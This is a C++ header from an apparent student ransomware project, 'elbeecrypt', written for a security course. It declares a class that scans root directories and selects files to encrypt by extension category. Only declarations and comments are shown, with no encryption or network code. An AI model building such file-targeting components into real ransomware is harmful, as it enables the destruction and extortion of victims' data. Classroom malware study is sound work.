#pragma once

#include "elbeecrypt/common/io/hunter.hpp"
#include "elbeecrypt/common/targets/extensions.hpp"

namespace fs = std::filesystem;

namespace elbeecrypt::cryptor {
	/**
	 * @brief A subclass of the `Hunter` class that seeks out files to
	 * encrypt based on a given database of extensions. These extensions
	 * are grouped by category and are available under the following
	 * folder: `include/yelbeecrypt/common/targets/extgroup`.
	 *
	 * @author CECS-378 Group 10
	 * @file hunter-encryptor.hpp
	 */
	class HunterEncryptor: public elbeecrypt::common::io::Hunter {
		//Constructors & Destructor
		public:
			/**
			 * @brief Constructs a new HunterCryptor object with a list 
			 * of root paths to scan for targets.
			 * 
			 * @param roots The root paths to start from
			 */
			HunterEncryptor(const std::vector<fs::path>& roots);

			/**
			 * @brief Destroys the HunterEncryptor object.
			 */
			~HunterEncryptor(){}


		//Methods
		public:
			/**
			 * @brief Returns the string representation of this object.
			 * 
			 * @return The string representation of this object
			 */
			std::string toString();


		//Overrides
		protected:
			/**
			 * @brief Checks if a path is targetable or not. The check is
			 * based on the extension of the file in question.
			 * 
			 * @param path The path to check
			 * @return Whether the current path is targetable
			 */
			bool isTargetable(const fs::path& path);
	};
}